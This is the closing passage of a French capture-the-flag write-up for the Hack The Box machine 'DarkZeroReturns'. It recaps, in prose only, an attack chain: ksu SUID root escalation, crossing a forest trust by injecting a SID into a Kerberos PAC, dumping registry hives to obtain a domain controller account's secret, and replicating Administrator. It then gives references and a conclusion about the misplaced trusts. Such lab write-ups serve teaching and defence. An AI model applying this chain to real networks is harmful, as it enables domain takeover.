Kerberos a confirmé que nous le contrôlions.
ksu.mit l’a accepté pour le compte Unix root.
Comme ksu.mit était SUID root, il a donné l’UID 0.
```

## Pourquoi Celia ne donnait pas directement le flag

```text
Celia était Domain Admin dans darkzero.ext,
mais le flag était dans darkzero.htb.

Il fallait franchir la confiance,
injecter le bon groupe cible dans le PAC,
puis exploiter un droit spécialisé de sauvegarde.
```

## Pourquoi `DC01$` a débloqué la fin

```text
Celia étrangère ne pouvait pas faire proprement le DCSync final.
Elle pouvait toutefois sauvegarder les ruches.
Les ruches révélaient le secret de DC01$.
Le compte du contrôleur de domaine pouvait ensuite répliquer Administrator.
```

---

## 33. Références

- Hack The Box — Machines : https://www.hackthebox.com/machines
- Gitea Actions : https://docs.gitea.com/usage/actions/overview
- Gitea Actions Quickstart : https://docs.gitea.com/usage/actions/quickstart
- Microsoft — Security Identifiers : https://learn.microsoft.com/windows-server/identity/ad-ds/manage/understand-security-identifiers
- MIT Kerberos — ksu : https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/ksu.html
- MIT Kerberos — `.k5login` : https://web.mit.edu/kerberos/krb5-current/doc/user/user_config/k5login.html
- Impacket : https://github.com/fortra/impacket

---

## Conclusion

DarkZeroReturns ne repose pas sur une seule « grosse » vulnérabilité. Elle repose sur une série de relations de confiance mal maîtrisées :

```text
l’application fait confiance à l’AST ;
Gitea fait confiance au workflow ;
le runner possède trop de droits ;
Active Directory permet de créer un principal ;
Linux fait confiance à cette identité Kerberos ;
une sauvegarde conserve un hash privilégié ;
une forêt accepte un SID personnalisé ;
RemoteRegistry peut sauvegarder des secrets ;
le compte machine peut répliquer le domaine.
```

Chaque faiblesse semble limitée lorsqu’elle est étudiée seule. Ensemble, elles permettent de partir d’une application web exposée et de terminer comme Administrator dans une deuxième forêt.
